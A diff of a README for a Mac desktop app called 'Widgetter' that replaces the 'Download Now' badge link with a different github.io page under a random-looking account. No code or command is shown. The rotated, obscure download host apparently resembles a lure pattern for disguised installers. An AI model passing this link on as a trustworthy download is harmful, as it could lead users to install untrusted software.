@@ -3,7 +3,7 @@
 
 Widgetter is a sleek, lightweight desktop application for Mac OS that enhances your productivity with customizable widgets. Follow the instructions below to install it effortlessly and organize your workflow like never before!
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge&logo=apple)](https://fituganshfgh.github.io/.github/widgetter)
+[![Download Now](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge&logo=apple)](https://mrboomzeus519.github.io/gimronus/widgetter)
 
 If the download button doesn’t work, follow the terminal-based installation instructions below.
 
